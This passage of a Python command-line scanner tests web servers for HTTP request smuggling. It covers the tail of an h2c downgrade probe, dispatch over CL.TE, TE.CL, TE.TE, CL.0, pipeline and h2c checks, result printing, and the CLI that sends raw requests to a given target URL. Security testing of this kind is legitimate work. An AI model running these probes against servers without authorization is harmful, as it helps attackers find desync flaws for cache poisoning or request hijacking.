                if isinstance(ev, h2.events.ConnectionTerminated):
                    break

            resp_differs = _check_response_differs(b"", response_data)
            vuln = accepted
            details = (
                f"Server accepted HTTP/1.1 UA on H2 stream ({response_data[:100]})"
                if accepted
                else "Server rejected or did not process HTTP/1.1 UA on H2"
            )

            if not vuln and (elapsed - b_elapsed) >= 1.0:
                details = (
                    f"Slow H2 response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s)"
                )

            results.append(
                SmuggleAttempt(
                    exploit="smuggling_payload",
                    tool="HTTP Request Smuggler",
                    technique="h2c_downgrade",
                    category="h2c",
                    method="GET",
                    path=path,
                    te_header="h2c",
                    cl_header="0",
                    smuggled_request="H2 HEADERS with HTTP/1.1 User-Agent",
                    status_baseline=b_status,
                    status_test=200 if accepted else 0,
                    size_baseline=b_size,
                    size_test=len(response_data),
                    response_differs=resp_differs,
                    smuggled_executed=vuln,
                    vulnerable=vuln,
                    details=details,
                    error="",
                )
            )
        finally:
            sock.close()

    except Exception as e:
        results.append(
            SmuggleAttempt(
                technique="h2c_downgrade",
                category="h2c",
                method="GET",
                path=path,
                te_header="h2c",
                cl_header="0",
                smuggled_request="",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                response_differs=False,
                smuggled_executed=False,
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    return results


# ─── Dispatch ────────────────────────────────────────────────────────────────

_CATEGORY_DISPATCH: dict[
    str, Callable[..., Coroutine[Any, Any, list[SmuggleAttempt]]]
] = {
    "cl_te": _test_cl_te,
    "te_cl": _test_te_cl,
    "te_te": _test_te_te,
    "chunked_cl": _test_chunked_cl,
    "pipeline": _test_pipeline,
    "cl0": _test_cl0,
    "h2c": _test_h2c,
}


# ─── Print Results ───────────────────────────────────────────────────────────


def print_results(result: SmuggleResult) -> None:
    """Imprime resultados formatados no terminal."""
    print()
    print(color("[*]", Cyber.CYAN, Cyber.BOLD), "HTTP Request Smuggling Test")
    print(color("[*]", Cyber.CYAN), f"Target: {result.target}")
    print(
        color("[*]", Cyber.CYAN),
        f"Host: {result.host}:{result.port} (TLS: {result.tls})",
    )
    print(
        color("[*]", Cyber.CYAN),
        f"Baseline: HTTP {result.baseline_status} ({result.baseline_size} bytes)",
    )
    print()

    if result.issues:
        print(color("[!]", Cyber.YELLOW, Cyber.BOLD), "Issues:")
        for issue in result.issues:
            print(color("    -", Cyber.YELLOW), issue)
        print()

    # Agrupa por categoria
    categories: dict[str, list[SmuggleAttempt]] = {}
    for attempt in result.attempts:
        categories.setdefault(attempt.category, []).append(attempt)

    for cat, attempts in categories.items():
        vuln_in_cat = [a for a in attempts if a.vulnerable]
        if vuln_in_cat:
            print(
                color("[!]", Cyber.RED, Cyber.BOLD),
                f"{cat}: {len(vuln_in_cat)} vulnerable(s)",
            )
            for a in vuln_in_cat:
                print(color("    [-]", Cyber.RED), f"{a.technique}: {a.details}")
                print_exploit_info(a.exploit, a.tool)
        else:
            print(color("[+]", Cyber.GREEN), f"{cat}: secure")

    print()
    if result.overall_status == "vulnerable":
        print(
            color("[!]", Cyber.RED, Cyber.BOLD),
            "VULNERABLE — HTTP Request Smuggling possible!",
        )
    else:
        print(color("[+]", Cyber.GREEN, Cyber.BOLD), "SECURE — No smuggling detected")
    print()


# ─── Main Scan ───────────────────────────────────────────────────────────────


async def run_scan(
    target: str,
    categories: list[str] | None,
    timeout: float,
    output_file: str | None,
) -> SmuggleResult:
    """Executa scan de HTTP Request Smuggling."""
    host, path, port, tls = _parse_url(target)

    # Baseline via raw socket
    b_elapsed = 0.0
    try:
        baseline_request = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n").encode()
        sock = _create_connection(host, port, timeout, tls)
        try:
            t0 = time.monotonic()
            b_status, b_response = _send_raw(sock, baseline_request, timeout)
            b_elapsed = time.monotonic() - t0
            b_size = len(b_response)
        finally:
            sock.close()
    except Exception:
        b_status = 0
        b_size = 0

    # Testa categorias
    all_attempts: list[SmuggleAttempt] = []
    cats = categories if categories is not None else list(_CATEGORY_MAP.keys())

    for cat in cats:
        tester = _CATEGORY_DISPATCH.get(cat)
        if tester is None:
            continue
        raw = await tester(host, port, path, timeout, tls, b_status, b_size, b_elapsed)
        all_attempts.extend(raw)

    # Classifica resultados
    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
    blocked_techs = [
        a.technique
        for a in all_attempts
        if not a.vulnerable and a.error and "connection" in a.error.lower()
    ]

    # Issues
    issues: list[str] = []
    if vuln_techs:
        issues.append(f"{len(vuln_techs)} techniques vulnerable")
    if blocked_techs:
        issues.append(f"{len(blocked_techs)} techniques blocked by connection issues")

    overall = "vulnerable" if vuln_techs else "secure"

    result = SmuggleResult(
        target=target,
        host=host,
        port=port,
        tls=tls,
        baseline_status=b_status,
        baseline_size=b_size,
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        blocked_techniques=blocked_techs,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, asdict(result))

    return result


# ─── CLI ─────────────────────────────────────────────────────────────────────


def build_parser() -> argparse.ArgumentParser:
    """Constrói parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-smuggle",
        description="HTTP Request Smuggling — Testa CL.TE, TE.CL, TE.TE, Pipeline, CL.0, H2C",
    )
    parser.add_argument("url", help="URL alvo para teste")
    parser.add_argument(
        "-c",
        "--categories",
        nargs="+",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categorias para testar (default: todas)",
    )
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa scan uma vez."""
    result = safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=getattr(args, "categories", None),
            timeout=getattr(args, "timeout", 5.0),
            output_file=getattr(args, "output", None),
        )
    )
    return 1 if result.overall_status == "vulnerable" else 0


def main() -> int:
    """Entry point principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=create_banner(_BANNER_LINES, "HTTP Request Smuggling"),
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None)),
        prompt="smuggle> ",
        description="Teste de HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, Pipeline, CL.0, H2C).",
        example="https://target.com -c cl_te te_cl cl0 h2c",
        contextual_help=(
            "Categorias disponíveis:\n"
            "  cl_te        — Content-Length vs Transfer-Encoding\n"
            "  te_cl        — Transfer-Encoding vs Content-Length\n"
            "  te_te        — Transfer-Encoding obfuscation\n"
            "  chunked_cl   — Chunked com Content-Length conflitante\n"
            "  pipeline     — HTTP pipelining desync\n"
            "  cl0          — Content-Length: 0 confusion\n"
            "  h2c          — HTTP/2 cleartext upgrade smuggling"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
